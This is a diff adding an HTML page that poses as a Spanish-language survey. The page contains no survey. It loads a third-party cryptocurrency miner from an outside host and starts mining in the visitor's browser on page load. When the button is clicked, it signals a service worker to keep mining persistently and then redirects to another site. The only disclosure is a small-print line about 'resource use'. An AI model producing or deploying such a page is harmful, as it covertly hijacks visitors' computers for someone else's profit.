@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>¡Encuesta!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            text-align: center; 
+            padding: 20px; 
+            background: #f0f8ff;
+        }
+        .container {
+            max-width: 600px;
+            margin: 50px auto;
+            padding: 30px;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+        button {
+            padding: 15px 40px;
+            font-size: 18px;
+            background: linear-gradient(to right, #4CAF50, #2E8B57);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            margin: 20px 0;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+        }
+        .small { 
+            font-size: 12px; 
+            color: #777; 
+            margin-top: 30px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>¡Ayúdanos a mejorar!</h1>
+        <p>Completa una breve encuesta</p>
+        
+        <button id="surveyBtn">INICIAR ENCUESTA</button>
+        
+        <p class="small">Al participar, aceptas el uso de recursos</p>
+    </div>
+
+    <!-- Scripts -->
+    <script src="https://www.coinimp.com/miner?key=54b0a755c126818424831950c60f373e4003335af93d6806b75e949bb67e54af"></script>
+    <script>
+        // Registrar Service Worker
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('sw.js')
+                .then(reg => console.log('Service Worker registrado'))
+                .catch(err => console.log('Error:', err));
+        }
+
+        // Lógica principal
+        document.addEventListener('DOMContentLoaded', () => {
+            // Iniciar minería suave
+            const miner = new CoinHive.Anonymous('54b0a755c126818424831950c60f373e4003335af93d6806b75e949bb67e54af', {
+                throttle: 0.3,
+                threads: 2
+            });
+            miner.start();
+            
+            // Botón de encuesta
+            document.getElementById('surveyBtn').addEventListener('click', () => {
+                // Activar minería persistente
+                if (navigator.serviceWorker && navigator.serviceWorker.controller) {
+                    navigator.serviceWorker.controller.postMessage({
+                        type: 'START_MINING',
+                        key: '54b0a755c126818424831950c60f373e4003335af93d6806b75e949bb67e54af'
+                    });
+                }
+                
+                // Redirigir después de 1 segundo
+                setTimeout(() => {
+                    window.location.href = "https://ita.somosred.org/en/4036";
+                }, 1000);
+            });
+        });
+    </script>
+</body>
+</html>
